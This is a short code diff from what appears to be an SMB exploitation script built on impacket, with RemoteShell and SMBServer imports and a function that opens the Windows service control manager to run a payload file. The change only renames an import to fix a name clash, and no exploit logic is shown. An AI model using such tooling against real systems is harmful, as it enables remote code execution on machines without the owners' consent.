@@ -1,5 +1,5 @@
 from mysmb import MYSMB, RemoteShell, SMBServer
-from impacket.dcerpc.v5 import scmr
+from impacket.dcerpc.v5 import scmr as scmr_
 from struct import pack, unpack, unpack_from
 import sys
 import socket
@@ -1169,7 +1169,7 @@ def do_system_mysmb_session(conn, pipe_name, share, mode, payload_file):
         print("[-] Failed to connect to svcctl RPC: %s" % str(e))
         return
     smbConn.setTimeout(10000)
-    scmr.bind(scmr.MSRPC_UUID_SCMR)
+    scmr.bind(scmr_.MSRPC_UUID_SCMR)
     resp = scmr.hROpenSCManagerW(scmr)
     scHandle = resp["lpScHandle"]
 
